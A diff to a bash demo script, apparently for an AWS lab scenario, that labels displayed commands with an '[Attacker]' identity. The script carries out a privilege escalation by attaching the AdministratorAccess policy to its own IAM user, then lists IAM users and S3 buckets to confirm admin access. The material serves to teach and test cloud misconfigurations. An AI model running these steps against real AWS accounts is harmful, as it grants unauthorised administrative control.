@@ -22,12 +22,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -68,7 +70,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -81,7 +83,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 # Step 3: Test current permissions (should be limited)
 echo -e "${YELLOW}Step 3: Testing current permissions${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
     echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
 else
@@ -92,7 +94,7 @@ fi
 echo -e "${YELLOW}Step 4: Escalating privileges via iam:AttachUserPolicy${NC}"
 echo "Attaching AdministratorAccess managed policy to self..."
 
-show_attack_cmd "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn $MANAGED_POLICY_ARN"
+show_attack_cmd "Attacker" "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn $MANAGED_POLICY_ARN"
 aws iam attach-user-policy \
     --user-name $STARTING_USER \
     --policy-arn $MANAGED_POLICY_ARN
@@ -107,12 +109,12 @@ echo ""
 # Step 5: Verify admin access
 echo -e "${YELLOW}Step 5: Verifying administrator access${NC}"
 echo "Testing admin permissions (listing IAM users)..."
-show_cmd "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
+show_cmd "Attacker" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
 echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
 echo "Testing S3 access..."
-show_cmd "aws s3 ls"
+show_cmd "Attacker" "aws s3 ls"
 aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
